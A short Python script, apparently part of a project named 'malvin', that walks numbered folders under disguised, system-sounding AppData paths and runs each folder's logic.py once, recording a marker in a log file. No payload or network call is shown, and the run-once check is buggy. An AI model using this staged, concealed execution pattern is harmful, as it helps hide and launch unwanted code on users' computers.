import os


###########################################################
#                          CLASS                          #
###########################################################

class User():
    def __init__(self):
        self.name = os.environ.get( "USERNAME" )
        self.dir = f'C:\\Users\\{os.environ.get( "USERNAME" )}\\AppData\\Local\\sysLogTime'
        self.files = f'{self.dir}\\authoSystemLoader\\malvin-main'

###########################################################
#                          MKOBJ                          #
###########################################################

user = User()

###########################################################
#                       INSTALLING                        #
###########################################################



def install():
    end = False
    fileCount = 1

    while not end:
        try:
            with open(f'{user.files}\\sysdat{fileCount}\\log', 'a+') as data:
                rdata = data.read()
                if len(rdata) == 0:
                    print(f'Содержимое rdata: {rdata}\nДлина rdata: {len(rdata)}')
                    os.system(f'{user.files}\sysdat{fileCount}\logic.py')
                    data.write('3476537127365')

        except:
            end = True
            print('Каталог завершен')

        fileCount+=1



###########################################################
#                          MAIN                           #
###########################################################

def main():
    install()

if __name__ == '__main__':
    main()